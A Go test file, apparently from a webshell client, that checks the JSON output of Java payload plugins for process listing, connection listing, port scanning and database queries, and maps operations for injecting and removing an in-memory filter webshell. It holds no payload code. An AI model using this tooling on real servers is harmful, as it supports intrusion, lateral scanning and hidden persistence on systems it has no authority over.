package webshell

// javaext_test.go — Java 载体的进程/网络/数据库插件。
//
// 这三个插件是对脚本载体（php/jsp 源码）的等价重写，最容易翻车的不是编译而是回显格式：
// 前端面板按脚本插件那套 JSON 结构解析（procs / open / columns+rows），字段一漂移
// 就是「面板空白但接口 200」。所以测试重点放在结构断言上，而不是「能跑就行」。

import (
	"encoding/json"
	"net"
	"strconv"
	"strings"
	"testing"
)

// TestJavaPayloadProcList 进程列表：结构与脚本插件一致，且支持按 PID/关键字过滤。
func TestJavaPayloadProcList(t *testing.T) {
	run := javaRunner(t)
	raw := strings.TrimSpace(run("proc", "list", ""))
	if strings.HasPrefix(raw, "ERROR:") {
		t.Fatalf("proc 返回错误: %s", raw)
	}
	var got struct {
		OS    string `json:"os"`
		Procs []struct {
			PID  int    `json:"pid"`
			Name string `json:"name"`
			User string `json:"user"`
		} `json:"procs"`
	}
	if err := json.Unmarshal([]byte(raw), &got); err != nil {
		t.Fatalf("proc 输出不是合法 JSON: %v\n%s", err, head(raw, 300))
	}
	if got.OS != "linux" && got.OS != "win" {
		t.Fatalf("os 字段异常: %q", got.OS)
	}
	if len(got.Procs) == 0 {
		t.Fatal("进程列表为空")
	}
	// 至少要有一个带名字的进程——名字为空说明 /proc/<pid>/status 解析全挂
	named := 0
	for _, p := range got.Procs {
		if strings.TrimSpace(p.Name) != "" {
			named++
		}
	}
	if named == 0 {
		t.Fatal("所有进程名都为空，status 解析有问题")
	}

	// 按 PID 过滤：必须只剩那一条，且 PID 精确匹配（不能退化成模糊匹配）
	pid := strconv.Itoa(got.Procs[0].PID)
	filtered := strings.TrimSpace(run("proc", "list", pid))
	var one struct {
		Procs []struct {
			PID int `json:"pid"`
		} `json:"procs"`
	}
	if err := json.Unmarshal([]byte(filtered), &one); err != nil {
		t.Fatalf("过滤结果不是合法 JSON: %v\n%s", err, head(filtered, 300))
	}
	if len(one.Procs) != 1 || strconv.Itoa(one.Procs[0].PID) != pid {
		t.Fatalf("按 PID %s 过滤结果异常: %s", pid, head(filtered, 300))
	}
}

// TestJavaPayloadNetList 连接列表：Linux 读 /proc/net/tcp，Windows 走 netstat。
// 两个平台都必须能解析出至少监听项——本机跑测试时总有监听端口。
func TestJavaPayloadNetList(t *testing.T) {
	run := javaRunner(t)
	raw := strings.TrimSpace(run("net", "list", "", ""))
	if strings.HasPrefix(raw, "ERROR:") {
		t.Fatalf("net list 返回错误: %s", raw)
	}
	var conns []struct {
		Proto  string `json:"proto"`
		Local  string `json:"local"`
		Remote string `json:"remote"`
		State  string `json:"state"`
	}
	if err := json.Unmarshal([]byte(raw), &conns); err != nil {
		t.Fatalf("net list 输出不是合法 JSON: %v\n%s", err, head(raw, 300))
	}
	if len(conns) == 0 {
		t.Fatal("连接列表为空（netstat / /proc/net/tcp 解析可能全挂）")
	}
	listen := 0
	for _, c := range conns {
		if c.Local == "" {
			t.Fatalf("local 为空，地址解码有问题: %+v", c)
		}
		if strings.Contains(strings.ToUpper(c.State), "LISTEN") {
			listen++
		}
	}
	if listen == 0 {
		t.Logf("未发现 LISTEN 状态连接（容器内可能正常），共 %d 条", len(conns))
	}
}

// TestJavaPayloadNetScan 端口扫描：对已知监听端口必须扫出 open，对同批次的关闭端口不能误报。
func TestJavaPayloadNetScan(t *testing.T) {
	run := javaRunner(t)
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Skip("本机无法监听，跳过扫描测试:", err)
	}
	defer ln.Close()
	open := ln.Addr().(*net.TCPAddr).Port

	// 关掉的对照端口：用 1（tcpmux，现网基本不可能监听），避免临时端口段里
	// 恰好有别的服务在听，导致误报断言反过来把测试搞挂
	closed := 1
	raw := strings.TrimSpace(run("net", "scan", "127.0.0.1",
		strconv.Itoa(closed)+","+strconv.Itoa(open)))
	var got struct {
		Host string  `json:"host"`
		Open []int64 `json:"open"`
	}
	if err := json.Unmarshal([]byte(raw), &got); err != nil {
		t.Fatalf("net scan 输出不是合法 JSON: %v\n%s", err, head(raw, 300))
	}
	if got.Host != "127.0.0.1" {
		t.Fatalf("host 回显异常: %q", got.Host)
	}
	found := false
	for _, p := range got.Open {
		if int(p) == open {
			found = true
		}
		if int(p) == closed {
			t.Fatalf("关闭端口 %d 被误报为 open: %s", closed, raw)
		}
	}
	if !found {
		t.Fatalf("监听端口 %d 未被扫出: %s", open, raw)
	}
}

// TestJavaPayloadDB Java 载荷没有驱动时必须是「可解释的 ERROR」而不是异常或挂死。
// 本机若恰好有 mysql 驱动（构建机常装），则断言输出是合法结果 JSON。
func TestJavaPayloadDB(t *testing.T) {
	run := javaRunner(t)

	probe := strings.TrimSpace(run("db", "drivers"))
	if strings.HasPrefix(probe, "ERROR:") {
		t.Fatalf("db drivers 不该按 ERROR 返回: %s", probe)
	}
	if !strings.Contains(probe, "classpath=") {
		t.Fatalf("db drivers 缺少 classpath 信息: %s", head(probe, 200))
	}

	out := strings.TrimSpace(run("db", "mysql", "127.0.0.1", "3306", "u", "p", "nodb", "SELECT 1"))
	if strings.HasPrefix(out, "ERROR:") {
		// 预期路径：驱动缺失 / 连接失败，都必须是带原因的单行错误
		if strings.ContainsAny(out, "{}") {
			t.Fatalf("ERROR 回显不应夹带 JSON: %s", head(out, 200))
		}
		return
	}
	var res struct {
		OK      bool     `json:"ok"`
		Columns []string `json:"columns"`
	}
	if err := json.Unmarshal([]byte(out), &res); err != nil {
		t.Fatalf("db 结果不是合法 JSON: %v\n%s", err, head(out, 300))
	}
}

// TestJavaExtOpMapping 插件 op → 载荷 op 的映射是纯函数，直接断言，避免改错参数顺序
// （db 有 7 个位置参数，错一位就是连到别的库上）。
func TestJavaExtOpMapping(t *testing.T) {
	p := ExtParams{
		DBType: "pgsql", Host: "10.0.0.5", Port: "5432", User: "u", Pass: "p", DB: "d",
		SQL: "SELECT 1", ScanHost: "10.0.0.6", ScanPorts: "80,443",
		FilterName: "fs", GateHeader: "X-A", GateValue: "b", Cmd: "java",
	}
	cases := []struct {
		op   string
		jop  string
		args []string
	}{
		{"proc_list", "proc", []string{"list", "java"}},
		{"net_scan", "net", []string{"scan", "10.0.0.6", "80,443"}},
		{"net_list", "net", []string{"list"}},
		{"db_exec", "db", []string{"pgsql", "10.0.0.5", "5432", "u", "p", "d", "SELECT 1"}},
		{"db_probe", "db", []string{"drivers"}},
		{"memshell_add_filter", "memshell_inject", []string{"fs", "X-A", "b", "cmd"}},
		{"memshell_list", "memshell_list", nil},
		{"memshell_del", "memshell_remove", []string{"fs"}},
	}
	for _, c := range cases {
		jop, args, ok := javaExtOp(c.op, p)
		if !ok {
			t.Fatalf("%s 未被识别为 Java 承载的插件", c.op)
		}
		if jop != c.jop {
			t.Fatalf("%s → 载荷 op 期望 %q，实际 %q", c.op, c.jop, jop)
		}
		if strings.Join(args, "\x00") != strings.Join(c.args, "\x00") {
			t.Fatalf("%s 参数期望 %q，实际 %q", c.op, c.args, args)
		}
	}
	// 没有等价实现的插件必须明确拒绝，不能悄悄发空 payload 给目标端
	for _, op := range []string{"zip", "unzip", "jar_load", "screenshot", "servlet_list"} {
		if _, _, ok := javaExtOp(op, p); ok {
			t.Fatalf("%s 不该被 Java 载体承接", op)
		}
	}
}

func head(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}
